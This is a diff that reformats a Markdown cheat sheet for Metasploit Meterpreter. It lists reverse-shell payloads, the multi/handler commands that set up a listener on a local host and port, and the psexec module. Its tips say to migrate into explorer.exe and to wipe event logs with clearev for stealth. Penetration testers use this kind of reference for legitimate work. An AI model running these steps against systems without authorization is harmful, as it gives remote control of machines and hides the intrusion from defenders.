@@ -3,7 +3,6 @@
 
 ## 🧪 Common Meterpreter Payloads (used with MSFvenom)
 
-
 | Payload                             | Description                                    |
 | ----------------------------------- | ---------------------------------------------- |
 | `windows/meterpreter/reverse_tcp`   | Connects back to attacker (reverse shell)      |
@@ -20,11 +19,25 @@
 msfconsole
 ```
 
+```
 use exploit/multi/handler
+```
+
+```
 set payload windows/meterpreter/reverse_tcp
+```
+
+```
 set LHOST 192.168.1.10
+```
+
+```
 set LPORT 4444
+```
+
+```
 run
+```
 
 ## Meterpreter Command Reference
 
@@ -79,13 +92,13 @@ use exploit/windows/smb/psexec
 ```
 
 📌 Tips
-Always migrate to a stable process (e.g., explorer.exe)
 
-Use clearev to remove event logs (stealth)
-
-Combine with meterpreter scripts or post modules for automation
+- Always migrate to a stable process (e.g., explorer.exe)
+- Use clearev to remove event logs (stealth)
+- Combine with meterpreter scripts or post modules for automation
 
 ## Exit and Cleanup
+
 ```
 exit -y
 ```
